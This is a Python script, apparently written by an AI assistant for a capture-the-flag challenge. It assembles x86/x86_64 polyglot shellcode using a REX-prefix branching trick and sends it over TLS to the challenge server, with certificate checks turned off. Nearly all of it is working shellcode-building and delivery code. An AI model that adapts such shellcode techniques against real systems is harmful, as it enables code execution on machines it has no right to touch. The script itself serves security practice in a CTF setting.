#!/usr/bin/env python3
"""
x86/x86_64 Polyglot Shellcode
Author: Assistant
Purpose: Create shellcode that works on both x86 and x86_64
Created: 2025-11-09

Strategy: Use REX prefix technique to branch between 32-bit and 64-bit code

Expected result: Get flags for both x86 and x86_64
Produced result: TBD
"""

from keystone import *
import socket
import ssl

TARGET_HOST = "381KwDeUheCsUMjHJ.polyglot.challs.pwnoh.io"
TARGET_PORT = 1337

def build_x86_x64_polyglot():
    """
    Create polyglot shellcode for x86 and x86_64

    Uses REX prefix trick:
    - In x86 (32-bit): 0x40 is 'inc eax'
    - In x86_64: 0x40 is a REX prefix (no-op)
    """

    ks32 = Ks(KS_ARCH_X86, KS_MODE_32)
    ks64 = Ks(KS_ARCH_X86, KS_MODE_64)

    # First, build the payloads to know their sizes
    x86_code, _ = ks32.asm("""
        push 0x00000000
        push 0x656c6c65
        push 0x74746142
        mov ecx, esp
        mov ebx, 0x94c5
        mov eax, 237
        int 0x80
        xor eax, eax
        int 0x80
    """)

    x64_code, _ = ks64.asm("""
        push 0x00
        mov rax, 0x656c6c6574746142
        push rax
        mov rsi, rsp
        mov rdi, 0x94c5
        mov rax, 237
        syscall
        xor rdi, rdi
        mov rax, 60
        syscall
    """)

    # Build the dispatcher components
    part1, _ = ks32.asm("xor eax, eax")  # Sets ZF=1, eax=0
    magic = b'\x40'  # inc eax in 32-bit (ZF=0), REX prefix in 64-bit (no effect, ZF stays 1)

    # The jump needs to skip the x86 code
    # Keystone interprets the jz argument as an address and subtracts 2 (size of jz)
    # We want to jump +30 bytes (len of x86_code), so we need to pass 32
    jump, _ = ks32.asm(f"jz {len(bytes(x86_code)) + 2}")

    # Combine all parts
    shellcode = bytes(part1) + magic + bytes(jump) + bytes(x86_code) + bytes(x64_code)

    return shellcode

def submit_shellcode(shellcode_hex):
    """Submit shellcode to the challenge server"""
    print(f"\n[*] Submitting {len(shellcode_hex)//2} bytes of shellcode...")
    print(f"[*] Hex: {shellcode_hex[:80]}{'...' if len(shellcode_hex) > 80 else ''}\n")

    try:
        # Create SSL context (disable certificate verification for CTF)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        # Connect to server
        sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)
        ssl_sock = context.wrap_socket(sock, server_hostname=TARGET_HOST)

        # Read initial prompt
        data = b''
        while b'Submit your shellcode' not in data:
            chunk = ssl_sock.recv(4096)
            if not chunk:
                break
            data += chunk
            print(chunk.decode('utf-8', errors='ignore'), end='')

        # Send shellcode
        ssl_sock.sendall(shellcode_hex.encode() + b'\n')

        # Read response
        response = b''
        try:
            while True:
                chunk = ssl_sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except:
            pass

        print(response.decode('utf-8', errors='ignore'))

        ssl_sock.close()

        return response

    except Exception as e:
        print(f"[!] Error: {e}")
        return None

if __name__ == "__main__":
    print("x86/x86_64 Polyglot Shellcode Builder")
    print("=" * 60)

    shellcode = build_x86_x64_polyglot()
    print(f"\nPolyglot shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}\n")

    submit_shellcode(shellcode.hex())
